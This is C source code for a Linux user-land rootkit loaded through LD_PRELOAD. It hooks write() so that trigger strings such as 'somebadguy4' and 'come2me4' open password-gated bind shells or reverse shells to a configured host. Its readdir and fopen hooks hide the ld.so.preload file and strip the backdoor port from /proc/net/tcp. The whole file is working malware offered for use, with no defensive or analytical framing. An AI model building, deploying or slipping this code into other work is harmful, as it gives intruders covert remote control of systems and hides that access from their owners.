/*
 * A user-land root kit for use on Linux devices.
 * Loaded in LD_PRELOAD to hook relevant functions.
 *
 * Features:
 * 	IPv4/6 Bind Shells
 * 	IPv4/6 Reverse Shells
 * 	Hide process
 * 	Hide ports
 * 	Hide LD_PRELOAD files
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <dlfcn.h>
#include <dirent.h>
#include <arpa/inet.h>
#include <fcntl.h>

//define constants below
#define KEY_4 "somebadguy4"
#define KEY_6 "somebadguy6"
#define PASS "supersecretpassword"
#define PORT 64330
#define REM_PORT 56433
#define REM_HOST4 "127.0.0.1"
#define REM_HOST6 "::1"
#define REV_KEY4 "come2me4"
#define REV_KEY6 "come2me6"

//file to hide
#define FILENAME "ld.so.preload"

// hex of port to hide 64330
#define KEY_PORT "FB4A"


// Build an IPv4 bind shell
int ipv4_bind(void) {

	struct sockaddr_in addr;
	addr.sin_family = AF_INET;
	addr.sin_port = htons(PORT);
	addr.sin_addr.s_addr = INADDR_ANY;

	int sockfd = socket(AF_INET, SOCK_STREAM, 0);

	const static int optval = 1;

	setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));

	bind(sockfd, (struct sockaddr *)&addr, sizeof(addr));

	listen(sockfd, 0);

	int new_sockfd = accept(sockfd, NULL, NULL);

	for (int i = 0; i < 3; i++) {
		dup2(new_sockfd, i);
	}

	char input[30]; //reading in our input password to see what happens next

	// check the input string against the hardcoded password; execute shell on match
	read(new_sockfd, input, sizeof(input));
	input[strcspn(input, "\n")] = 0;

	if (strcmp(input, PASS) == 0) {
		execve("/bin/sh", NULL, NULL);
		close(sockfd);
	} else {
		shutdown(new_sockfd, SHUT_RDWR);
		close(sockfd);
	}
}

int ipv6_bind(void) {

	struct sockaddr_in6 addr;
	addr.sin6_family = AF_INET6;
	addr.sin6_port = htons(PORT);
	addr.sin6_addr = in6addr_any;

	int sockfd = socket(AF_INET6, SOCK_STREAM, 0);

	const static int optval = 1;

	setsockopt(sockfd, IPPROTO_IPV6, IPV6_V6ONLY, &optval, sizeof(optval));
	setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));

	bind(sockfd, (struct sockaddr *)&addr, sizeof(addr));

	listen(sockfd, 0);

	int new_sockfd = accept(sockfd, NULL, NULL);

	for (int i = 0; i < 3; i++) {
		dup2(new_sockfd, i);
	}

	char input[30]; //reading in our input password to see what happens next

	// check the input string against the hardcoded password; execute shell on match
	read(new_sockfd, input, sizeof(input));
	input[strcspn(input, "\n")] = 0;

	if (strcmp(input, PASS) == 0) {
		execve("/bin/sh", NULL, NULL);
		close(sockfd);
	} else {
		shutdown(new_sockfd, SHUT_RDWR);
		close(sockfd);
	}
}

int ipv4_rev(void) {

	const char *host = REM_HOST4;

	struct sockaddr_in addr;
	addr.sin_family = AF_INET;
	addr.sin_port = htons(REM_PORT);
	inet_aton(host, &addr.sin_addr);

	struct sockaddr_in client;
	client.sin_family = AF_INET;
	client.sin_port = htons(PORT);
	client.sin_addr.s_addr = INADDR_ANY;

	int sockfd = socket(AF_INET, SOCK_STREAM, 0);

	bind(sockfd, (struct sockaddr *)&client, sizeof(client));

	connect(sockfd, (struct sockaddr *) &addr, sizeof(addr));

	for (int i = 0; i < 3; i++) {
		dup2(sockfd, i);
	}

	execve("/bin/sh", NULL, NULL);
	close(sockfd);

	return 0;
}

int ipv6_rev(void) {

	const char *host = REM_HOST6;

	struct sockaddr_in6 addr;
	addr.sin6_family = AF_INET6;
	addr.sin6_port = htons(REM_PORT);
	inet_pton(AF_INET6, host, &addr.sin6_addr);

	struct sockaddr_in6 client;
	client.sin6_family = AF_INET6;
	client.sin6_port = htons(PORT);
	client.sin6_addr = in6addr_any;

	int sockfd = socket(AF_INET6, SOCK_STREAM, 0);

	bind(sockfd, (struct sockaddr *)&client, sizeof(client));

	connect(sockfd, (struct sockaddr *) &addr, sizeof(addr));

	for (int i = 0; i < 3; i++) {
		dup2(sockfd, i);
	}

	execve("/bin/sh", NULL, NULL);
	close(sockfd);

	return 0;
}

// hook the write() syscall
ssize_t write(int fd, const void *buf, size_t count) {

	ssize_t (*new_write)(int fd, const void *buf, size_t count);

	ssize_t result;

	new_write = dlsym(RTLD_NEXT, "write");

	char *bind4 = strstr(buf, KEY_4);
	char *bind6 = strstr(buf, KEY_6);
	char *rev4 = strstr(buf, REV_KEY4);
	char *rev6 = strstr(buf, REV_KEY6);

	if (bind4 != NULL){
		fd = open("/dev/null", O_WRONLY | O_APPEND);
		result = new_write(fd, buf, count);
		ipv4_bind();
	}

	else if (bind6 != NULL){
		fd = open("/dev/null", O_WRONLY | O_APPEND);
		result = new_write(fd, buf, count);
		ipv6_bind();
	}

	else if (rev4 != NULL){
		fd = open("/dev/null", O_WRONLY | O_APPEND);
		result = new_write(fd, buf, count);
		ipv4_rev();
	}

	else if (rev6 != NULL){
		fd = open("/dev/null", O_WRONLY | O_APPEND);
		result = new_write(fd, buf, count);
		ipv6_rev();
	} else {
		result = new_write(fd, buf, count);
	}

	return result;
}

// Hook readdir() and its structure to hide files
struct dirent *(*old_readdir)(DIR *dir);
struct dirent *readdir(DIR *dirp) {

	old_readdir = dlsym(RTLD_NEXT, "readdir");

	struct dirent *dir;

	while (dir = old_readdir(dirp)) {
		if (strstr(dir->d_name, FILENAME) == 0) break;
	}
	return dir;
}

struct dirent64 *(*old_readdir64)(DIR *dir);
struct dirent64 *readdir64(DIR *dirp) {

	old_readdir64 = dlsym(RTLD_NEXT, "readdir64");

	struct dirent64 *dir;

	while (dir = old_readdir64(dirp)) {
		if (strstr(dir->d_name, FILENAME) == 0) break;
	}
	return dir;
}

// Now we hook fopen() in order to hide the open TCP ports
FILE *(*orig_fopen)(const char *pathname, const char *mode);
FILE *fopen(const char *pathname, const char *mode) {

	orig_fopen = dlsym(RTLD_NEXT, "fopen");

	char *ptr_tcp = strstr(pathname, "/proc/net/tcp");

	FILE *fp;

	if (ptr_tcp != NULL) {

		char line[256];
		FILE *temp = tmpfile();
		fp = orig_fopen(pathname, mode);
		while (fgets(line, sizeof(line), fp)) {

			char *listener = strstr(line, KEY_PORT);
			if (listener != NULL) {
				continue;
			} else {
				fputs(line, temp);
			}
		}
		return temp;
	}
	fp = orig_fopen(pathname, mode);
	return fp;
}

FILE *(*orig_fopen64)(const char *pathname, const char *mode);
FILE *fopen64(const char *pathname, const char *mode) {

	orig_fopen64 = dlsym(RTLD_NEXT, "fopen64");

	char *ptr_tcp = strstr(pathname, "/proc/net/tcp");

	FILE *fp;

	if (ptr_tcp != NULL) {

		char line[256];
		FILE *temp = tmpfile64();
		fp = orig_fopen(pathname, mode);
		while (fgets(line, sizeof(line), fp)) {

			char *listener = strstr(line, KEY_PORT);
			if (listener != NULL) {
				continue;
			} else {
				fputs(line, temp);
			}
		}
		return temp;
	}
	fp = orig_fopen64(pathname, mode);
	return fp;
}
